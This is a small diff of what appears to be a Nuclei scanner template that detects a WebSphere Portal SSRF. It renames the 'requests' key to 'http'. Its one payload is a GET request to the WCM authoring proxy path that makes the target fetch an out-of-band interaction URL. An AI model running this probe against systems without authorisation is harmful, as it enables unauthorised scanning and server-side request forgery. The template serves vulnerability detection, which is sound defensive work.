@@ -7,7 +7,7 @@ info:
   reference: https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/
   tags: ssrf, websphere
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/{{interactsh-url}}"
